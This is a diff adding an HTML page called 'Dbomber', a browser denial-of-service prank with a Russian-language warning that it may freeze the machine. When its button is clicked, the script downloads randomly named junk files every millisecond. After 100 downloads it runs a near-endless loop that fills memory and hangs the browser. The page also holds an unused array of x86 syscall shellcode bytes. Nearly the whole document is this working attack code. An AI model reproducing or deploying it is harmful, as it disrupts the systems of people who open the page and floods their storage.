@@ -1,0 +1,217 @@
+<html>
+<style>
+    html {background-color:#010409;}
+    button{background-color: #010409;border: 2px solid #9090ff;
+    font-family: 'consolas';
+    font-size:20px;
+    color:white;
+    width: 150px;
+    height: 40px;
+    display: block;
+    margin: auto;
+    border-radius: 4px;
+    position: static;
+    }
+    #buffer
+    {
+        font-family: 'consolas';
+    font-size:20px;
+    color:white;
+    text-align: center;
+    }
+    #main
+    {
+        background-color: #010409;border: 2px solid #9090ff;
+        width: 90%;
+        height: 480px;
+    }
+</style>
+
+<br>
+<br>
+<br>
+<div id="main">
+    <p id="buffer">Dbomber<br>ВНИМАНИЕ!!МОЖЕТ ЗАВИСНУТЬ НАГЛУХО <br>Заполни экран доконца и тогда сработает</p>
+<button onclick="javascript:fdg(code,buf1)">ЗАПУСТИТЬ</button></button>
+</div>
+<script>
+var code = [
+"\xb8\x04\x00\x00\x00",
+"\xbb\x01\x00\x00\x00",
+"\xb9\x00\x00\x00\x00",
+"\xba\x0f\x00\x00\x00",
+"\xcd\x80\xb8\x01\x00",
+"\x00\x00\xbb\x00\x00",
+"\x00\x00\xcd\x80"];
+var buf1 = document.getElementById("buffer");
+function fdg(text,buf)
+{
+    Loading();
+    
+    
+}
+var c1,c2,c3,c4,c5,c6,c7,c8,c9;
+var rd_0 = 0;;
+function Loading(id)
+{
+    console.log(rd_0);
+    rd_0++;
+    if(rd_0 > 9)
+    {
+        rd_0 = 0;
+        setInterval("dbomber()",1);
+        //ExploitOverLoadBuffer();
+    }
+    if(rd_0 == 0)
+    {
+        c1 = "#9090ff";c2 = "#010409";
+        c3 = "#010409";c4 = "#010409";
+        c5 = "#010409";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 1)
+    {
+        c1 = "#9090ff";c2 = "#010409";
+        c3 = "#010409";c4 = "#010409";
+        c5 = "#010409";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 2)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#010409";c4 = "#010409";
+        c5 = "#010409";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 3)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#010409";
+        c5 = "#010409";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 4)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#010409";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 5)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#9090ff";c6 = "#010409";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 6)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#9090ff";c6 = "#9090ff";
+        c7 = "#010409";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 7)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#9090ff";c6 = "#9090ff";
+        c7 = "#9090ff";c8 = "#010409";
+        c9 = "#010409";
+    }
+    if(rd_0 == 8)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#9090ff";c6 = "#9090ff";
+        c7 = "#9090ff";c8 = "#9090ff";
+        c9 = "#010409";
+    }
+    if(rd_0 == 9)
+    {
+        c1 = "#9090ff";c2 = "#9090ff";
+        c3 = "#9090ff";c4 = "#9090ff";
+        c5 = "#9090ff";c6 = "#9090ff";
+        c7 = "#9090ff";c8 = "#9090ff";
+        c9 = "#9090ff";
+    }
+    document.documentElement.style.background = "linear-gradient(180deg,"+c1+" 0%,"+c2+"   8%,"+c3+","+c4+" 40%,"+c5+" 88%,"+c6+" 93%,"+c7+" 95%,"+c8+" 96%,"+c9+" 100%)";
+    console.log(document.documentElement.style.background+"c1:"+c1+" c2"+c2+"\nc3:"+c3+" c4:"+c4+"\nc5:"+c5+" c6:"+c6+"\nc7:"+c7+" c8:"+c8+"\nc9:"+c9);
+}
+var  bStrSymbols = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_123456789";
+ var buffer = '';
+ let fch_count = 0;
+ var randName;
+ var fPassOut = '';
+function PassGen(limit_str)
+{
+    for(var Chunk_0 = 1;Chunk_0 <=limit_str; Chunk_0++)
+    {
+        fch_count++;
+        fPassOut += bStrSymbols.charAt(Math.floor(Math.random() * 63));
+        if(fch_count > 43)
+        {
+            fPassOut += '\n';
+            fch_count = 0;
+        }
+    }
+    return fPassOut;
+}
+function writeFile(name, value)
+{
+       var val = value;
+      if (value === undefined) {
+      val = "";
+       }
+      var download = document.createElement("a");
+      download.href = "data:text/plain;content-disposition=attachment;filename=file," + val;
+      download.download = name;
+      download.style.display = "none";
+      download.id = "download"; document.body.appendChild(download);
+      document.getElementById("download").click();
+      document.body.removeChild(download);
+}
+const PLAPImem = performance.memory;
+const PLmemoryUsed  = (PLAPImem.usedJSHeapSize / 1024) / 1024;
+const PLmemoryTotal = (PLAPImem.totalJSHeapSize / 1024);
+const PLmemoryJsHeapSize  = (PLAPImem.jsHeapSizeLimit / 1024) / 1024;
+let dcount = 0;
+let explout_enable = false;
+function dbomber()
+{
+    console.log("filechunk:"+randName+"\n"+"buffer:"+buffer+"\n"+PLmemoryUsed+"\n"+PLmemoryJsHeapSize+"\n"+PLmemoryTotal);
+    dcount++;
+    randName = PassGen(64);
+    buffer += PassGen(86);
+    writeFile(randName,buffer);
+    if(dcount === 100)
+    {
+        explout_enable = true;
+        ExploitOverLoadBuffer();
+    }
+}
+function ExploitOverLoadBuffer()
+{
+if(!explout_enable)
+{
+    dbomber();
+}
+if(explout_enable)
+{
+    var fStackMemory = new Array();
+for(var i = 0;  i != 2147246764; ++i) {
+  fStackMemory[i] = 99999999999999;
+  console.log("stack:"+i+"\nmem:"+fStackMemory.length );
+  fdg("stack:"+i+"\nmem:"+fStackMemory.length+":MiB",buf1);
+}
+}
+}
+</script>
+</html>
